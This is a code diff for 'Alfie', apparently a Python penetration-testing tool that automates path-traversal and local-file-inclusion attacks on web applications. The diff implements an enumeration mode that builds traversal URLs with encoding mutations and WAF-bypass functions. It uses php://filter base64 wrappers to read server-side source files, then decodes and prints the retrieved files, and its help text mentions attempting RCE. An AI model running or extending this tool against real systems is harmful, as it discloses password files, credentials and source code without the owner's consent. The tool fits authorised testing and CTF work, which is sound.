@@ -11,6 +11,9 @@ import queue
 import signal
 import json
 import mutation
+import exrex
+import re
+import base64
 # This is necessary for disabling the 'verify=False' warning:
 import urllib3
 urllib3.disable_warnings()
@@ -73,38 +76,47 @@ parser = argparse.ArgumentParser(
     epilog='Author: 4wayhandshake')
 mode_help = '''Mode of operation: "scan", "enumerate", or "batch". 
 Use "scan" to find a valid path traversal. The program will make requests using various traversals until at least one non-relative filepath is found.
-Use "enumerate" to take a known path traversal, and try to enumerate files on the target system. If possible, attempts will be made to gain RCE.
+Use "enumerate" to .
 Use "batch" to enter scan mode, then (if successful) proceed to enumerate afterwards.
 '''
 target_system_help = (f'List of attributes of the target system, to help choose what files to check for. '
                       f'No spaces. Ex "linux,php". Choose attributes from this list:\n{all_keywords_string}')
-parser.add_argument('mode', choices=['filter', 'scan', 'enum', 'batch'], help=mode_help)
-parser.add_argument('--version', action='version', version=f'%(prog)s {version_number}')
-parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Show extra output to console. Does not affect log file verbosity.')
-parser.add_argument('-u', '--url', dest='url', help='Base URI of the target. Ex. "http://mywebsite.htb/index.php?page="', type=str, required=True)
 
-scan_group = parser.add_argument_group('scan', 'Arguments for "scan" mode')
-scan_group.add_argument('--min', dest='min', help='Minimum number of steps "back" to traverse.', type=int, default=1)
-scan_group.add_argument('--max', dest='max', help='Maximum number of steps "back" to traverse.', type=int, default=10)
+parser.add_argument('-u', '--url', dest='url', help='Base URL of the target. Ex. "http://mywebsite.tld/index.php?page="', type=str, required=True)
 
-enum_group = parser.add_argument_group('enum', 'Arguments for "enum" mode')
-enum_group.add_argument('-ex', '--example-lfi', dest='example_lfi', help='Example of a URL that successfully discloses a local file (the bold part of the output of "scan" mode) Ex. "/../../../etc/passwd"', type=str, required=True)
+display_args = parser.add_argument_group('Display / Output', 'Affect the way that Alfie looks')
+display_args.add_argument('--version', action='version', version=f'%(prog)s {version_number}')
+display_args.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Show extra output to console. Does not affect log file verbosity.')
+display_args.add_argument('--no-color', dest='colorless', action='store_true', help='Don\'t ANSII color escapes in console output.')
+display_args.add_argument('--quiet', dest='quiet', action='store_true', help='Don\'t print the banner or options.')
+display_args.add_argument('-o', '--output', dest='output', help='File to log positive results.', type=str)
 
-parser.add_argument('--target_system', dest='target_system', help=target_system_help, type=str, default='any')
-parser.add_argument('-t', '--threads', dest='threads', help='Number of threads to use for processing.', type=int, default=40)
-parser.add_argument('--timeout', dest='timeout', help='Timeout for each request (in seconds).', type=int, default=5)
-parser.add_argument('-X', '--request-type', dest='request_type', help='Type of HTTP request to use. Ex "POST".', type=str, default='GET')
-parser.add_argument('-b', '--cookies', dest='cookies', help='Cookies to include in each request. Ex "key1=value1; key2=value2" (Tip: use document.cookie in browser console)', type=str)
-parser.add_argument('-d', '--data', dest='data', help='Data to include in each request. Only applies if using a POST request (see -X option). Ex "key1=value1; key2=value2".', type=str)
-parser.add_argument('-fs', '--filter-sizes', dest='filter_sizes', help='Comma-separated list of sizes (in bytes) to filter from the results.', type=str)
-parser.add_argument('-fw', '--filter-words', dest='filter_words', help='Comma-separated list of word counts to filter from the results.', type=str)
-parser.add_argument('-fc', '--filter-codes', dest='filter_codes', help='Comma-separated list of HTTP status codes to filter from the results.', type=str)
-parser.add_argument('-o', '--output', dest='output', help='File to log positive results.', type=str)
-parser.add_argument('--no-color', dest='colorless', action='store_true', help='Don\'t ANSII color escapes in console output.')
-parser.add_argument('--quiet', dest='quiet', action='store_true', help='Don\'t print the banner or options.')
+traversal_args = parser.add_argument_group('Traversal', 'Affect the bounds and method of traversal')
+traversal_args.add_argument('--min', dest='min', help='Minimum number of steps "back" to traverse.', type=int, default=0)
+traversal_args.add_argument('--max', dest='max', help='Maximum number of steps "back" to traverse.', type=int, default=10)
 
-parser.add_argument('-nx', '--no-extra-tests', dest='no_extra_tests', action='store_true', help='Don\'t run the extra LFI tests (only useful for WAF evasion).')
-parser.add_argument('-ne', '--no-ending-checks', dest='no_ending_checks', action='store_true', help='Don\'t check for null-byte termination (to save time).')
+request_args = parser.add_argument_group('Request', 'Affect how requests are sent to the target')
+request_args.add_argument('--target_system', dest='target_system', help=target_system_help, type=str, default='any')
+request_args.add_argument('-t', '--threads', dest='threads', help='Number of threads to use for processing.', type=int, default=10)
+request_args.add_argument('--timeout', dest='timeout', help='Timeout for each request (in seconds).', type=int, default=5)
+request_args.add_argument('-X', '--request-type', dest='request_type', help='Type of HTTP request to use. Ex "POST".', type=str, default='GET')
+request_args.add_argument('-b', '--cookies', dest='cookies', help='Cookies to include in each request. Ex "key1=value1; key2=value2" (Tip: use document.cookie in browser console)', type=str)
+request_args.add_argument('-d', '--data', dest='data', help='Data to include in each request. Only applies if using a POST request (see -X option). Ex "key1=value1; key2=value2".', type=str)
+
+response_args = parser.add_argument_group('Response', 'Affect how responses are received and processed')
+response_args.add_argument('-fs', '--filter-sizes', dest='filter_sizes', help='Comma-separated list of sizes (in bytes) to filter from the results.', type=str)
+response_args.add_argument('-fw', '--filter-words', dest='filter_words', help='Comma-separated list of word counts to filter from the results.', type=str)
+response_args.add_argument('-fc', '--filter-codes', dest='filter_codes', help='Comma-separated list of HTTP status codes to filter from the results.', type=str)
+
+mode_subparsers = parser.add_subparsers(dest='mode', required=True, help='Mode of operation.')
+filter_mode_parser = mode_subparsers.add_parser('filter', help='Attempt to establish a baseline of which responses should be filtered. The most likely filters will be suggested')
+scan_mode_parser = mode_subparsers.add_parser('scan', help='Find a valid path traversal. The program will make requests using various traversals until at least one non-relative filepath is found.')
+enum_mode_parser = mode_subparsers.add_parser('enum', help='Use a known path traversal, and try to enumerate files on the target system. If possible, attempts will be made to gain RCE')
+batch_mode_parser = mode_subparsers.add_parser('batch', help='Automatically run \"filter\" mode, then \"scan\" mode, then \"enum\" mode')
+
+enum_mode_parser.add_argument_group('enum', 'Arguments for "enum" mode')
+enum_mode_parser.add_argument('-ex', '--example-lfi', dest='example_lfi', help='Example of a traversal that successfully discloses a local file (the bold part of the output of "scan" mode) Ex. "/../../../etc/passwd"', type=str, required=True)
+enum_mode_parser.add_argument('-nx', '--no-extra-tests', dest='no_extra_tests', action='store_true', help='Don\'t run the extra LFI tests (only useful for WAF evasion).')
 
 args = parser.parse_args()
 
@@ -226,12 +238,12 @@ traversals = [
 endings = ['', '%00']
 
 mutations = [
-        mutation.identity,
-        mutation.urlencode_specialchars,
-        mutation.urlencode_morechars,
-        mutation.double_urlencode_specialchars,
-        mutation.double_urlencode_morechars
-    ]
+    mutation.identity,
+    mutation.urlencode_specialchars,
+    mutation.urlencode_morechars,
+    mutation.double_urlencode_specialchars,
+    mutation.double_urlencode_morechars
+]
 
 bypasses = [
     mutation.identity,
@@ -320,9 +332,8 @@ def validate_args():
         print("Invalid request type provided. Only GET and POST are supported")
         sys.exit(1)
 
-    if not is_positive_int(args.min) or args.min <= 0:
-        print("Invalid minimum traversal depth provided (must be at least 1)"
-              "For traversal depth of 0 use a different tool, like wfuzz or ffuf.")
+    if not is_positive_int(args.min):
+        print("Invalid minimum traversal depth provided (must be at least 0)")
         sys.exit(1)
 
     if not is_positive_int(args.max) or args.max < args.min:
@@ -450,11 +461,11 @@ def make_request(method, url, req_cookie, req_json, req_data=None):
             response = requests.post(url, cookies=req_cookie, json=req_json, data=req_data, timeout=args.timeout)
         else:
             response = requests.get(url, cookies=req_cookie, timeout=args.timeout)
-        if args.verbose:
-            code = int(response.status_code)
-            num_bytes = len(response.content)
-            num_words = len(response.text.split())
-            print(f"{' '*64}\n[+] {url:<60}\n    HTTP {code:<8} Size: {num_bytes:<12} Words: {num_words:<20}")
+        # if args.verbose:
+        #     code = int(response.status_code)
+        #     num_bytes = len(response.content)
+        #     num_words = len(response.text.split())
+        #     print(f"{' '*64}\n[+] {url:<60}\n    HTTP {code:<8} Size: {num_bytes:<12} Words: {num_words:<20}")
         return response
     except requests.RequestException as e:
         if args.colorless:
@@ -464,7 +475,24 @@ def make_request(method, url, req_cookie, req_json, req_data=None):
         return None
 
 
-def process_urls(job_queue, exit_on_success=False, ignore_filters=False):
+def find_longest_base64_segment(sample):
+    def is_base64_segment(segment):
+        try:
+            if len(segment) % 4 == 0:
+                base64.b64decode(segment, validate=True)
+                return True
+            return False
+        except Exception:
+            return False
+
+    base64_pattern = re.compile(r'[A-Za-z0-9+/=]+')
+    segments = base64_pattern.findall(sample)
+    valid_segments = [seg for seg in segments if is_base64_segment(seg)]
+    if not valid_segments:
+        return None
+    return max(valid_segments, key=len)
+
+def process_urls(job_queue, exit_on_success=False, ignore_filters=False, show_results=False):
     global exit_flag, max_request_index
     while not exit_flag:
         try:
@@ -474,6 +502,14 @@ def process_urls(job_queue, exit_on_success=False, ignore_filters=False):
                 method = args.request_type.upper()
                 resp = make_request(method, url, request_cookie, request_data)
                 if (resp is not None) and (ignore_filters or matches(resp, url)):
+                    if 'expect_base64' in job:
+                        b64 = find_longest_base64_segment(resp.text)
+                        if len(b64) > 40:
+                            try:
+                                job['decoded'] = base64.b64decode(b64, validate=True)
+                            except Exception as e:
+                                print(f'An exception occurred while attempting to base64-decode a result:\n{b64}')
+                                continue
                     job['numerics'] = {
                         'status_code': resp.status_code,
                         'byte_count': len(resp.content),
@@ -486,6 +522,8 @@ def process_urls(job_queue, exit_on_success=False, ignore_filters=False):
                     successes[job['filepath']].append(job)
                     if exit_on_success:
                         exit_flag = True
+                    if show_results:
+                        show_result(job)
                 if job['idx'] > max_request_index:
                     max_request_index = job['idx']
                 job_queue.task_done()
@@ -494,6 +532,28 @@ def process_urls(job_queue, exit_on_success=False, ignore_filters=False):
             continue
         except Exception as e:
             print(e)
+
+
+def show_result(job):
+    # Any job passed to this function should have been "successful", but just make sure anyway
+    if 'numerics' not in job:
+        print(f'Unsuccessful job was passed to show_result():\n{json.dumps(job,indent="    ")}')
+        return
+    #lfi = job['url'][len(args.url):]
+    lfi = job['url']
+    status_code = job['numerics']['status_code']
+    byte_count = job['numerics']['byte_count']
+    word_count = job['numerics']['word_count']
+    if args.verbose:
+        if args.colorless:
+            print(f"{' ' * 64}\n[+] {lfi:<60}\n    HTTP {status_code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
+        else:
+            print(f"{' ' * 64}\n{colors.GREEN}[+] {lfi:<60}{colors.END}\n    HTTP {status_code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
+    else:
+        if args.colorless:
+            print(f"[+] {lfi:<60}")
+        else:
+            print(f"{colors.GREEN}[+] {lfi:<60}{colors.END}")
 
 
 def signalHandler(signum, frame):
@@ -520,15 +580,24 @@ def writeLogfile(filename, successful_urls):
         print(f"While writing the output file, an unexpected error occurred: {e}")
 
 
-def printOptions(mode):
+def print_options(mode):
     print('='*64)
     print(f'URL: {args.url:>59}')
     if args.verbose:
         print(f'Verbose mode: {"enabled":>50}')
-    # if args.lfi_wordlist != parser.get_default('lfi_wordlist'):
-    #     print(f'LFI wordlist: {args.lfi_wordlist:>50}')
-    # if args.fuzz_wordlist != parser.get_default('fuzz_wordlist'):
-    #     print(f'Fuzz wordlist: {args.fuzz_wordlist:>49}')
+
+    if args.mode == "filter":
+        pass
+    elif args.mode == "scan":
+        pass
+    elif args.mode == "enum":
+        print(f'Example LFI: {args.example_lfi:>51}')
+        print(f'No extra tests: {str(args.no_extra_tests):>47}')
+
+    if args.min != parser.get_default('min'):
+        print(f'Minimum traversal steps: {args.min:>39}')
+    if args.max != parser.get_default('max'):
+        print(f'Maximum traversal steps: {args.max:>39}')
     if args.threads != parser.get_default('threads'):
         print(f'Threads: {args.threads:>55}')
     if args.filter_codes != parser.get_default('filter_codes'):
@@ -537,10 +606,6 @@ def printOptions(mode):
         print(f'Size filter (bytes): {args.filter_sizes:>43}')
     if args.filter_words != parser.get_default('filter_words'):
         print(f'Word count filter (# words): {args.filter_words:>35}')
-    if args.min != parser.get_default('min'):
-        print(f'Minimum traversal steps: {args.min:>39}')
-    if args.max != parser.get_default('max'):
-        print(f'Maximum traversal steps: {args.max:>39}')
     if args.timeout != parser.get_default('timeout'):
         print(f'Timeout: {args.timeout:>54}s')
     if args.request_type != parser.get_default('request_type'):
@@ -549,17 +614,10 @@ def printOptions(mode):
         print(f'Cookies: {args.cookies:>55}')
     if args.data:
         print(f'Data: {args.data:>58}')
-    #if args.ending != parser.get_default('ending'):
-    #    s = f'"{args.ending}"'
-    #    print(f'Ending string: {s:>49}')
     if args.output:
         print(f'Output file: {args.output:>51}')
     if args.colorless:
         print(f'Colorless mode: {"omit ANSII color codes in all output":>48}')
-    if args.no_extra_tests:
-        print(f'No extra tests: {"only run the defined enumeration, no extras":>48}')
-    if args.no_ending_checks:
-        print(f'No ending checks: {"do not check for null-byte termination":>46}')
     print('='*64+'\n')
 
 
@@ -795,6 +853,8 @@ def scan():
     Once "scan" mode finds this successful combination, we can greatly expedite "enum" mode.
     :return: True if a traversal was found, otherwise False.
     """
+    files_useful_for_scan = ['/etc/passwd', 'C:\\boot.ini', 'boot.ini']
+    scan_target_files = [f for f in files_to_test if (f.get('path') in files_useful_for_scan)]
     # Create a queue of requests to make
     job_queue = queue.Queue()
     # index of request. They might not come out sequentially
@@ -804,7 +864,7 @@ def scan():
         request_queue = queue.Queue()
         # Show progress indicating what level of depth we're at?
         # For each file...
-        for target_file in files_to_test:
+        for target_file in scan_target_files:
             # Don't try to find this file if the path is parameterized (those are for "enumerate" mode only)
             if 'variables' in target_file:
                 continue
@@ -902,9 +962,130 @@ def enum(example_job):
                 f"{colors.RED}Please use the output of \"scan\" mode as an example, or at least use a successful LFI "
                 f"for one of the files already defined in file-list.json\n{colors.END}")
         sys.exit(1)
-    print(json.dumps(example_job, sort_keys=True, indent='    '))
 
-def concurrent_async_requests(job_queue, exit_early, ignore_filters):
+    if args.verbose:
+        parsed_job_text = json.dumps(example_job, sort_keys=True, indent='    ')
+        print(f'Example job was parsed as the following:\n{parsed_job_text}')
+
+
+
+    # Should try all files without variables then all the files with variables
+    # There should also be accommodations for PHP files
+
+    def find_first(iterable, predicate):
+        return next((item for item in iterable if predicate(item)), None)
+
+    def assemble_job(f, _slash, _traversal, _ending, _depth, _mutation_func_name, _bypass_func_name, use_php_base64=False):
+        _filepath = f['path']
+        if _filepath.startswith('/') and len(_filepath) > 1 and _depth > 0:
+            _filepath = _filepath[1:]
+        _base_resource = f'{_slash}{_depth * _traversal}{_filepath}{_ending}'
+        if use_php_base64:
+            php_b64 = 'php://filter/convert.base64-encode/resource='
+            _base_resource = f'{php_b64}{_depth * _traversal}{_filepath}{_ending}'
+        _mut = find_first(mutations, lambda m: m.__name__ == _mutation_func_name)
+        _byp = find_first(bypasses, lambda b: b.__name__ == _bypass_func_name)
+        if not _mut or not _byp:
+            print(f'Failed to look up mutation or bypass by name. '
+                  f'Mutation: {_mutation_func_name}  Bypass: {_bypass_func_name}')
+        _url = args.url + _byp(_mut(_base_resource))
+        _job = {
+            "filepath": f['path'],
+            "traversal": _traversal,
+            "depth": _depth,
+            "leading_slash": (_slash == '/'),
+            "ending": _ending,
+            "mutation": _mut.__name__,
+            "bypass": _byp.__name__,
+            "url": _url,
+            "idx": -1
+        }
+        if use_php_base64:
+            _job['expect_base64'] = 1
+        return _job
+
+    # Create a queue of requests to make
+    job_queue = queue.Queue()
+    # We know the depth of the path to /etc/hosts or boot.ini, so...
+    # - We can try any absolute filepaths at this depth
+    # - We can try all relative filepaths/filenames at any depth
+
+    # Slash, traversal, ending, mutation, and bypass are all known.
+    # i.e. the only variables are filepath and depth.
+    slash = '/' if example_job['leading_slash'] else ''
+    traversal = example_job['traversal']
+    ending = example_job['ending']
+    depth = example_job['depth']
+
+    # 1) Absolute filepaths without variables
+    # 2) Relative filepaths without variables
+    # 3) Absolute filepaths with variables
+    # 4) Relative filepaths with variables
+    # While doing any of the above, accommodate PHP
+
+    def add_job(file, depth):
+        nonlocal idx
+        use_php_b64 = False
+        if file['path'].lower().endswith('.php'):
+            use_php_b64 = True
+        job = assemble_job(file, slash, traversal, ending, depth, example_job['mutation'], example_job['bypass'], use_php_b64)
+        job['idx'] = idx
+        idx += 1
+        job_queue.put(job)
+
+    def process_fixed(files, depth_range):
+        for file in files:
+            for d in depth_range:
+                add_job(file, d)
+
+    def process_variable(files, depth_range):
+        for file in files:
+            for d in depth_range:
+                for fp in exrex.generate(file['regex'], 200):
+                    file['path'] = fp
+                    add_job(file, d)
+
+    idx = 0
+    depth_range = range(args.min, args.max + 1)
+
+    fixed_files = [f for f in files_to_test if 'variables' not in f]
+    variable_files = [f for f in files_to_test if 'variables' in f]
+
+    process_fixed([f for f in fixed_files if f['absolute'] == 1], [depth])
+    process_fixed([f for f in fixed_files if f['absolute'] == 0], depth_range)
+    process_variable([f for f in variable_files if f['absolute'] == 1], [depth])
+    process_variable([f for f in variable_files if f['absolute'] == 0], depth_range)
+
+    # Reset the successes dict
+    global successes
+    successes = {}
+    # Start issuing requests
+    return concurrent_async_requests(job_queue, exit_early=False, ignore_filters=False, show_results=True)
+
+
+def enum_report():
+    if len(successes) > 0:
+        for filepath in successes:
+            successful_jobs = successes[filepath]
+            shortest_job_idx = find_shortest_example(successful_jobs)
+            shortest_job = successful_jobs[shortest_job_idx]
+            if 'decoded' in shortest_job:
+                decoded_text = shortest_job['decoded'].decode()
+                if args.colorless:
+                    print(f"{' ' * 64}\n[+] Successfully decoded file: {filepath}:\n")
+                else:
+                    print(f"{' ' * 64}\n{colors.GREEN}[+] Successfully decoded file: {colors.BOLD}{filepath}{colors.UNBOLD}{colors.END}:\n")
+                for line in decoded_text.split('\n'):
+                    print('    ' + line)
+
+def find_shortest_example(successful_jobs):
+    shortest = (-1, math.inf)
+    for idx, job in enumerate(successful_jobs):
+        if len(job['url']) < shortest[1]:
+            shortest = (idx, len(job['url']))
+    return shortest[0]
+
+def concurrent_async_requests(job_queue, exit_early, ignore_filters, show_results=False):
     """
     Issue requests concurrently. Use up to the defined number of threads. SIGINT will terminate
     all requests and prevent new ones from starting.
@@ -912,6 +1093,7 @@ def concurrent_async_requests(job_queue, exit_early, ignore_filters):
     must have at least these keys: url, filepath, idx
     :param exit_early: process requests such that they stop after the first one deemed "successful"
     :param ignore_filters: When True, all requests are deemed "successful"
+    :param show_results: When True, positive results from requests will be printed out as they arrive.
     :return: total number of jobs that were enqueued
     """
     num_jobs = job_queue.qsize()
@@ -922,7 +1104,8 @@ def concurrent_async_requests(job_queue, exit_early, ignore_filters):
         workers = [executor.submit(process_urls,
                                    job_queue,
                                    exit_on_success=exit_early,
-                                   ignore_filters=ignore_filters) for _ in range(N)]
+                                   ignore_filters=ignore_filters,
+                                   show_results=show_results) for _ in range(N)]
         # Wait for all tasks to complete
         try:
             # Wait for all tasks to complete
@@ -1005,13 +1188,6 @@ def filter_probe_report(suggested_fc, suggested_fs, suggested_fw):
 
 def scan_report():
 
-    def find_shortest_example(successful_jobs):
-        shortest = (-1, math.inf)
-        for idx, job in enumerate(successful_jobs):
-            if len(job['url']) < shortest[1]:
-                shortest = (idx, len(job['url']))
-        return shortest[0]
-
     if len(successes) > 0:
         if args.verbose or True:
             for filepath in successes:
@@ -1025,6 +1201,8 @@ def scan_report():
                                   successful_jobs[shortest_job_idx]['url'][len(args.url):] + colors.END + colors.UNBOLD)
                     print(f"{' '*64}\n{colors.GREEN}[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s){colors.END}"
                           f" (See below for one example)\n    {bolded_url}")
+                if args.verbose:
+                    print(json.dumps(successful_jobs[shortest_job_idx], indent='   '))
     else:
         if args.colorless:
             print(f"{' ' * 64}\n[-] Failed to locate any LFI using the provided parameters")
@@ -1039,7 +1217,7 @@ def main():
             print(banner_colorless)
         else:
             print(banner)
-        printOptions(args.mode)
+        print_options(args.mode)
     # Register the signal handler for SIGINT
     signal.signal(signal.SIGINT, signalHandler)
     # Validate the args provided
@@ -1070,7 +1248,12 @@ def main():
         n = enum(example_job)
         end_time = time.time()
         elapsed = end_time - start_time
-        print(f"\nEnumeration complete: {max_request_index + 1}/{n} requests in {elapsed:.1f}s ({(max_request_index + 1) / elapsed:.0f} req/s)")
+        print(f"\nEnumeration complete: {n} requests in {elapsed:.1f}s ({n / elapsed:.0f} req/s)")
+        enum_report()
+
+    if args.mode == "batch":
+        print('TODO: I haven\'t written \"batch\" mode yet!')
+        sys.exit(0)
 
 
 if __name__ == "__main__":
